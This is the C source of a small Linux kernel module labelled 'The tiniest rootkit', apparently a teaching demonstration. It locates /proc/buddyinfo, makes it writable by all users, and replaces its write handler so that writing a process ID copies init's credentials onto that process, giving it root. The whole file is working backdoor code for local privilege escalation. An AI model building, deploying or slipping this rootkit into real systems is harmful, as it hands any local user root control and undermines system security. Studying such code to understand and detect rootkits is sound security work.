#include <linux/module.h>    // included for all kernel modules
#include <linux/kernel.h>    // included for KERN_INFO
#include <linux/init.h>      // included for __init and __exit macros
#include <linux/proc_fs.h>
#include <linux/sched.h>

#define MODULE_NAME "rootkit"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Julia Evans");
MODULE_DESCRIPTION("The tiniest rootkit");

static struct file_operations handler_fops;
const struct file_operations *handler_original = 0;
struct proc_dir_entry *handler, *root;



// returns the task_struct associated with pid
struct task_struct *get_task_struct_by_pid(unsigned pid) {
    struct pid *proc_pid = find_vpid(pid);
    struct task_struct *task;
    if(!proc_pid)
        return 0;
    task = pid_task(proc_pid, PIDTYPE_PID);
    return task;
}

static ssize_t make_pid_root (
        struct file *filp,
        const char __user *data,
        size_t sz,
        loff_t *l)
{
    char* dummy;
    unsigned pid = (int) simple_strtol(data, &dummy, 10);
    printk("YOU HAVE BEEN HACKED: Making PID %d root\n", pid);
    struct task_struct *task = get_task_struct_by_pid(pid);
    struct task_struct *init_task = get_task_struct_by_pid(1);
    if(!task || !init_task)
        return 1;
    task->cred = init_task->cred;

    return 1;
}
/**
 * Infects /proc/buddyinfo with a device handler that sets
*/
void install_handler(struct proc_dir_entry *root) {
    struct proc_dir_entry *ptr = root->subdir;
    while(ptr && strcmp(ptr->name, "buddyinfo"))
        ptr = ptr->next;
    if(ptr) {
        handler = ptr;
        ptr->mode |= S_IWUGO;
        handler_original = (struct file_operations*)ptr->proc_fops;
        // create new handler
        handler_fops = *ptr->proc_fops;
        handler_fops.write = make_pid_root;
        ptr->proc_fops = &handler_fops;
    }
}

static int __init module_init_proc(void) {
  static struct file_operations fileops_struct = {0};
  struct proc_dir_entry *new_proc;
  // dummy to get proc_dir_entry of /proc
  new_proc = proc_create("dummy", 0644, 0, &fileops_struct);
  root = new_proc->parent;

  // install the handler to wait for orders...
  install_handler(root);

  // it's no longer required.
  remove_proc_entry("dummy", 0);
  return 0;
}



static int __init rootkit_init(void)
{
    module_init_proc();
    printk(KERN_INFO "Starting kernel module!\n");
    return 0;    // Non-zero return means that the module couldn't be loaded.
}

static void __exit rootkit_cleanup(void)
{
  handler->proc_fops = handler_original;
  printk(KERN_INFO "Cleaning up module.\n");
}



module_init(rootkit_init);
module_exit(rootkit_cleanup);
